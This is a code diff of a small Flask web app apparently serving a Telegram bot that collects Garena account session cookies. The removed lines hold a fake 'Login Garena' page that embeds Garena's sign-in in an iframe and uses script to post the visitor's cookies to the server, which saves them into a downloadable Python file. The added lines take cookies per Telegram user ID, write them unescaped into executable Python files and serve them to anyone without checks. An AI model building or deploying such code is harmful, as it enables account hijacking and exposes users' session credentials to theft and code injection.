@@ -1,71 +1,47 @@
-from flask import Flask, request, render_template_string, send_file
-import json
+from flask import Flask, request, jsonify, send_file
 import os
 
 app = Flask(__name__)
 
-COOKIE_FILE = "change_cookie.py"
+# In-memory store to link Telegram user IDs and their cookie files (for demo)
+user_cookie_files = {}
 
-# Login page with iframe to Garena + JS to send cookies after 5 seconds
 @app.route("/login")
-def login():
-    page = """
-    <!DOCTYPE html>
-    <html>
-    <head><title>Login Garena</title></head>
-    <body>
-      <h3>Please log in below:</h3>
-      <iframe src="https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH" width="400" height="600"></iframe>
-
-      <script>
-        setTimeout(() => {
-          fetch("/grab-cookies", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ cookies: document.cookie })
-          }).then(() => {
-            alert("Cookies sent! You can now use the bot.");
-          });
-        }, 8000);  // Wait 8 seconds for login
-      </script>
-    </body>
-    </html>
+def login_page():
+    return """
+    <h2>Login to Garena</h2>
+    <p>Please login, and then send your Telegram user ID to the bot.</p>
     """
-    return render_template_string(page)
 
-# Receive cookies JSON, parse and save change_cookie.py
-@app.route("/grab-cookies", methods=["POST"])
-def grab_cookies():
-    data = request.get_json()
-    raw_cookies = data.get("cookies", "")
-    
-    # Parse cookies string into dict
-    cookies = {}
-    if raw_cookies:
-        parts = raw_cookies.split("; ")
-        for p in parts:
-            if "=" in p:
-                k,v = p.split("=", 1)
-                cookies[k] = v
+@app.route("/save_cookies", methods=["POST"])
+def save_cookies():
+    data = request.json
+    telegram_user_id = data.get("user_id")
+    cookies = data.get("cookies")
 
-    # Save to change_cookie.py
-    with open(COOKIE_FILE, "w") as f:
+    if not telegram_user_id or not cookies:
+        return jsonify({"error": "Missing user_id or cookies"}), 400
+
+    # Save the cookies to a python file for this user
+    filename = f"cookies_{telegram_user_id}.py"
+    with open(filename, "w") as f:
         f.write("def get_cookies():\n")
         f.write("    return {\n")
-        for k, v in cookies.items():
-            f.write(f'        "{k}": "{v}",\n')
+        for name, value in cookies.items():
+            f.write(f'        "{name}": "{value}",\n')
         f.write("    }\n")
 
-    print("Saved cookies:", cookies)
-    return {"status": "success"}
+    user_cookie_files[telegram_user_id] = filename
+    return jsonify({"status": "success", "filename": filename})
 
-# Endpoint to download the generated cookie file
-@app.route("/download-cookie")
-def download_cookie():
-    if os.path.exists(COOKIE_FILE):
-        return send_file(COOKIE_FILE, as_attachment=True)
-    return "No cookie file found", 404
+@app.route("/get_cookie_file/<user_id>")
+def get_cookie_file(user_id):
+    filename = f"cookies_{user_id}.py"
+    if os.path.exists(filename):
+        return send_file(filename, as_attachment=True)
+    else:
+        return "Cookie file not found", 404
+
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=5000)
